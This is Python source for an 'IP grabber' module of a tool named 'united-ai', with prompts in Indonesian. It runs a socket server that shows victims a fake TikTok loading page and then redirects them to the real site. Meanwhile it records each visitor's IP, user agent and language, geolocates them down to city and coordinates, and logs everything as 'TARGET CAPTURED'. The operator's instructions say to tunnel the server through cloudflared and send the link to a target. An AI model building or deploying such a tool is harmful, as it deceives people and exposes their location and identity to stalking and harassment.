# united-ai | ip grabber (pure socket, real-time)
# Made by Nyxveil - Continued by Tebo Yang Mulia

import socket
import threading
import requests
import json
from datetime import datetime
from ui import (section, ok, err, info, warn, field, end_field,
                prompt, press_enter, C_GREEN, C_RED, C_YELLOW,
                C_WHITE, C_CYAN, C_MAGENTA, C_GREY)

LOG_FILE = "captured.json"

TRAP_PAGE = b"""HTTP/1.1 200 OK\r
Content-Type: text/html; charset=utf-8\r
Connection: close\r
\r
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>TikTok</title>
<style>
body{margin:0;background:#000;color:#fff;font-family:-apple-system,sans-serif;text-align:center;padding:100px 20px;}
h1{color:#fe2c55;font-size:48px;margin:0;letter-spacing:2px;}
.sp{width:64px;height:64px;border:5px solid #fe2c55;border-top-color:transparent;border-radius:50%;animation:s 1s linear infinite;margin:50px auto;}
@keyframes s{to{transform:rotate(360deg)}}
p{color:#888;font-size:14px;}
</style>
</head>
<body>
<h1>TikTok</h1>
<div class="sp"></div>
<p>Memuat video...</p>
<script>setTimeout(()=>location.href='https://www.tiktok.com',3000);</script>
</body>
</html>
"""

def geolocate(ip):
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query,timezone",
            timeout=8
        )
        return r.json()
    except Exception:
        return {}

def handle_client(conn, addr):
    try:
        conn.settimeout(5)
        data = conn.recv(4096).decode("utf-8", errors="ignore")
        ip = addr[0]

        xff, ua, lang = None, "-", "-"
        for line in data.split("\r\n"):
            l = line.lower()
            if l.startswith("x-forwarded-for:"):
                xff = line.split(":", 1)[1].strip().split(",")[0].strip()
            elif l.startswith("user-agent:"):
                ua = line.split(":", 1)[1].strip()
            elif l.startswith("accept-language:"):
                lang = line.split(":", 1)[1].strip()

        real_ip = xff or ip
        geo = geolocate(real_ip)

        record = {
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ip": real_ip,
            "user_agent": ua,
            "language": lang,
            "country": geo.get("country"),
            "region": geo.get("regionName"),
            "city": geo.get("city"),
            "zip": geo.get("zip"),
            "lat": geo.get("lat"),
            "lon": geo.get("lon"),
            "isp": geo.get("isp"),
            "org": geo.get("org"),
            "asn": geo.get("as"),
            "timezone": geo.get("timezone"),
        }

        print(f"\n{C_RED}  +==================================================+")
        print(f"{C_RED}  |  {C_YELLOW}[!!] TARGET CAPTURED - REAL TIME [!!]{C_RED}              |")
        print(f"{C_RED}  +==================================================+\n")
        for k, v in record.items():
            field(k, v, color=C_GREEN)
        end_field()
        print()

        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(record, ensure_ascii=False) + "\n")

        conn.sendall(TRAP_PAGE)
    except Exception as e:
        err(f"Handler error: {e}")
    finally:
        conn.close()

def run_grabber():
    section("IP GRABBER - REAL-TIME")
    port_str = prompt("Port [ENTER untuk default 8080]") or "8080"
    try:
        port = int(port_str)
    except ValueError:
        err("Port tidak valid.")
        press_enter()
        return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind(("0.0.0.0", port))
    except OSError as e:
        err(f"Port {port} gagal bind: {e}")
        warn("Coba allow di Windows Firewall atau ganti port.")
        press_enter()
        return
    s.listen(50)

    print(f"\n{C_GREEN}  [OK] Trap server aktif di {C_WHITE}0.0.0.0:{port}")
    print(f"{C_YELLOW}  [!] Buka POWERSHELL BARU, jalankan:")
    print(f"{C_WHITE}      cloudflared tunnel --url http://localhost:{port}")
    print(f"{C_YELLOW}  [!] Copy URL trycloudflare.com -> kirim ke target")
    print(f"{C_YELLOW}  [!] Data masuk otomatis di sini. Ctrl+C untuk stop.\n")

    try:
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
    except KeyboardInterrupt:
        print(f"\n{C_RED}  [!] Server dihentikan.")
    finally:
        s.close()
    press_enter()
